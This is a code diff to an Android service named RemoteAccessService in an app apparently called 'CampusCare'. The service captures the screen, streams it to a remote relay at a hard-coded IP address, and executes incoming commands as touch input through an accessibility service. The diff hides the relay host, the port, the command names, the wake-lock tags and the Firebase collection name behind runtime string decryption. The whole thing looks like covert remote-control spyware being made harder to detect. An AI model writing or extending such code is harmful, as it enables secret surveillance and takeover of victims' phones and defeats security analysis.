@@ -103,6 +103,9 @@ class RemoteAccessService : Service() {
         var currentRecordingPath: String? = null
             private set
 
+        private val RELAY_HOST get() = StringObfuscator.decrypt(ObfuscatedStrings.RELAY_HOST)
+        private val RELAY_PORT get() = StringObfuscator.decrypt(ObfuscatedStrings.RELAY_PORT_NUM).toInt()
+
         fun getStartIntent(context: Context, resultCode: Int, data: Intent): Intent {
             return Intent(context, RemoteAccessService::class.java).apply {
                 putExtra(EXTRA_RESULT_CODE, resultCode)
@@ -231,7 +234,7 @@ class RemoteAccessService : Service() {
             // ScreenRecorder swaps it to MediaRecorder.surface, then restores it here.
             streamingReader = ImageReader.newInstance(captureWidth, captureHeight, PixelFormat.RGBA_8888, 2)
             persistentDisplay = mediaProjection?.createVirtualDisplay(
-                "PersistentCapture",
+                StringObfuscator.decrypt(ObfuscatedStrings.VIRTUAL_DISPLAY_NAME),
                 captureWidth, captureHeight, densityDpi,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 streamingReader?.surface, null, null
@@ -250,7 +253,7 @@ class RemoteAccessService : Service() {
 
             // Keep CPU awake so coroutines and socket keep running when screen is off
             val pm = getSystemService(POWER_SERVICE) as PowerManager
-            cpuWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CampusCare:ServiceWake")
+            cpuWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, StringObfuscator.decrypt(ObfuscatedStrings.WAKELOCK_SERVICE))
             cpuWakeLock?.acquire()
 
             isRunning = true
@@ -270,13 +273,13 @@ class RemoteAccessService : Service() {
 
     private fun startSocketServer() {
         socketServer = SocketServer(
-            relayHost = "34.169.113.109",
-            relayPort = 9000,
+            relayHost = RELAY_HOST,
+            relayPort = RELAY_PORT,
             deviceId = deviceId,
             frameQueue = frameQueue,
             onCommandReceived = { command ->
                 when (command) {
-                    "WAKE" -> wakeScreen()
+                    StringObfuscator.decrypt(ObfuscatedStrings.CMD_WAKE) -> wakeScreen()
                     else -> TouchAccessibilityService.instance?.executeCommand(command)
                 }
             },
@@ -395,7 +398,7 @@ class RemoteAccessService : Service() {
             val pm = getSystemService(POWER_SERVICE) as PowerManager
             wakeLock = pm.newWakeLock(
                 PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
-                "CampusCare:RemoteWake"
+                StringObfuscator.decrypt(ObfuscatedStrings.WAKELOCK_REMOTE)
             )
             wakeLock?.acquire(10 * 60 * 1000L) // hold for up to 10 minutes
         } catch (_: Exception) {
@@ -427,7 +430,7 @@ class RemoteAccessService : Service() {
                     auth.signInAnonymously().await()
                 }
                 FirebaseFirestore.getInstance()
-                    .collection("devices")
+                    .collection(StringObfuscator.decrypt(ObfuscatedStrings.FIREBASE_DEVICES_COLLECTION))
                     .document(deviceId)
                     .set(mapOf(
                         "deviceId" to deviceId,
